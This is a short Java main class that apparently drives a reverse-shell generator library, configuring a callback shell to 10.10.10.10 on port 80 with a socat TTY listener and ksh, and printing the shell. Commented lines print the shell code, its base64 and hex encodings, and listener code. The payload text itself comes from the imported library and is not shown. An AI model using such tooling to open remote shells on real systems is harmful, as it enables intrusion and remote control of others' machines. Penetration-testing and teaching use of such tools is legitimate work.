import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.ReverseShell;
import com.iteso.ReverseShellGenerator.ReverseShell.LISTENER;
import com.iteso.ReverseShellGenerator.ReverseShell.REVERSE_TYPE;
import com.iteso.ReverseShellGenerator.ReverseShell.SHELLS;

public class App {
    public static void main(String[] args) throws Exception {
        ReverseShell shell = ReverseShell.getShellInstance("10.10.10.10",
                                                            80, 
                                                            LISTENER.SOCAT_TTY,
                                                            REVERSE_TYPE.VLANG,
                                                            SHELLS.KSH);

        System.out.println(shell);

        //System.out.println(shell.getShellCode());
        //System.out.println(DEncoder.decodeFromBase64(DEncoder.encodeToBase64(shell.getShellCode())));
        //System.out.println(DEncoder.decodeFromHex(DEncoder.encodeToHex(shell.getShellCode())));
        //System.out.println(shell.getListenerCode());
    }
}